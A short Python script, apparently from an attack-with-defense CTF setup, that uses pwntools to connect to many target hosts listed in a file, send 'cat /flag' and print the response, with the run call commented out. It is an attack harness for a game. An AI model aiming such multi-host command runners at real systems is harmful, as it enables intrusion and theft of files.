from utils.awd import AwdAttack,AwdTask
from utils.readwrite import readlines
from os.path import dirname
import pwn

class Exp(AwdTask):

    def exp(self, ip,port):
        sh = pwn.remote(ip, port)
        pwn.context.arch = "i386"
        # 本来是 interactive，现在直接执行命令
        # sh.interactive()
        sh.sendline(b"cat /flag")
        result = sh.recv()
        print(result)

hosts = readlines(f"{dirname(__file__)}/../../ip.txt")
attacker = AwdAttack(hosts=hosts,task_class=Exp,port=80,thread_num=5)
# attacker.attack()